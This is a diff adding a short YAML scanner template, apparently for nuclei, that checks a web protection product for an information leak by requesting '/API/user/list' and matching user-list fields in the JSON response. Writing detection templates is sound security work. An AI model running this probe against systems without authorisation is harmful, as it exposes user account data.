@@ -1,0 +1,25 @@
+id: poc-yaml-wangyu-xingyun-web-protection-system-information-leakage
+info:
+  name: Wangyu Xingyun Web Protection System Information Leakage
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-leak
+http:
+  - method: GET
+    path:
+      - "/API/user/list"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "items"
+          - "username"
+          - "allowed_web_site"
+      - type: word
+        part: header
+        words:
+          - "application/json"
